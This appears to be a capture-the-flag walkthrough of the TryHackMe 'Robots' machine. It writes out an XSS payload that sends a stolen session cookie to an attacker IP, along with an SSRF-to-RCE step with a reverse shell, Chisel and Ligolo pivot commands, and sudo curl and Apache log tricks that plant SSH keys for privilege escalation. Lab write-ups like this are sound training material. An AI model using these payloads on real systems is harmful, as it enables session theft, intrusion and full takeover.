🧠 TryHackMe: Robots — Machine Walkthrough

Author: [0xb0b] • Difficulty: Medium-Hard
Tags: XSS, Cookie Theft via phpinfo(), SSRF → RCE, Docker Escape, SSH Hijack, Sudo Abuse, PrivEsc

    “A small tribute to Asimov, and a big exercise in chaining web exploits like a beast.”

🔍 Recon — Port & Web Enumeration

Initial nmap reveals:

    22/tcp → SSH

    80/tcp → Apache2

    9000/tcp → Apache2 default page

A robots.txt reveals 3 juicy paths:

/harming/humans  
/ignoring/human/orders  
/harm/to/self  

    /harm/to/self hosts a login page

    Others return 403 Forbidden

    Port 9000 gives nothing useful

Using gobuster inside /harm/to/self/ uncovers:

    admin.php (unauthorized access)

    Registration is allowed via username + DOB

🧠 Password = md5(username + ddmm)
🧰 Used CyberChef for hash generation
🧪 Example: md5("0xb0b0101")
🧬 Reflected XSS → Admin Session Hijack via phpinfo()

Logged in user input is reflected. Payload:

<script>alert("XSS")</script>

HttpOnly flag blocks cookie theft directly, but phpinfo() (from /server_info.php) leaks session memory.
⚙️ XSS Payload to Steal Admin Cookie via phpinfo():

var url = "http://robots.thm/harm/to/self/server_info.php";
var attacker = "http://10.14.90.235/exfil";
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
  if (xhr.readyState == XMLHttpRequest.DONE) {
    var match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
    if (match) {
      fetch(attacker + "?cookie=" + match[1]);
    }
  }
};

xhr.open("GET", url, true);
xhr.send(null);

🕳️ Served via:

<script src="http://10.14.90.235/legit_user.js"></script>

Admin accesses the page → cookie gets exfiltrated → swap in the session ID → You're now Admin.
💥 SSRF → Remote Code Execution (RCE)

admin.php lets us test external URLs.

🛠️ Used Python HTTP server:

python3 -m http.server 80

    Served whoami.php with:

<?php system('whoami'); ?>

🧠 Confirmed PHP execution
➡️ Dropped a PentestMonkey reverse shell
📞 Callback to listener = shell as www-data
🐳 Docker Escape Enumeration

Inside the container:

    Found .dockerenv

    robots.thm resolves locally → Docker container

    No DB on localhost — started internal Docker net scan

⚙️ Ligolo-ng TUN Setup:

sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.18.0.0/24 dev ligolo

Proxy / Agent:

./proxy -selfcert
./agent -connect 10.14.90.235:11601 --ignore-cert

🧠 Scanned 172.18.0.0/24 → Found 172.18.0.2 running MySQL
🔄 Chisel Port Forward → MySQL Access

Ligolo failed to forward MySQL properly
➡️ Switched to Chisel:
On Attacker:

./chisel server --reverse --port 51234

On Victim:

./chisel client 10.14.90.235:51234 R:3306:172.18.0.2:3306

🎯 Now accessible at 127.0.0.1:3306
🧠 mysql -h 127.0.0.1 -u robots -p

Database → users table → Discovered user rgiskard with hashed password.
🔓 Cracked with Double-MD5 Generator:

md5(md5(username + ddmm))

🧠 Brute forced ddmm combinations → recovered login hash
➡️ Gained SSH access as rgiskard
⚡ Privilege Escalation → dolivaw (via Sudo Wildcard Abuse)

As rgiskard, found sudo rights:

(ALL) NOPASSWD: /usr/bin/curl

Used curl wildcard abuse to overwrite ~/.ssh/authorized_keys of dolivaw:

sudo -u dolivaw curl 127.0.0.1/ -o dummy file:///tmp/id_rsa.pub -o /home/dolivaw/.ssh/authorized_keys

➡️ Login as dolivaw via custom private key
🧠 Got user flag
👑 Root Privilege Escalation — Apache Logging Exploit

dolivaw can sudo apache2 with full config:

sudo apache2 -f /tmp/apache2.conf -k start

🧨 Custom Apache Config:

ServerRoot "/tmp/myapache"
LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
Listen *:7777
ErrorLog /tmp/error.log
LogFormat "ssh-rsa AAAA... attacker@host" rootkey
CustomLog /root/.ssh/authorized_keys rootkey

🔥 Start server → Send HTTP request → Apache logs the SSH key to root’s authorized_keys

curl http://localhost:7777

➡️ SSH as root
🧠 Grab root flag
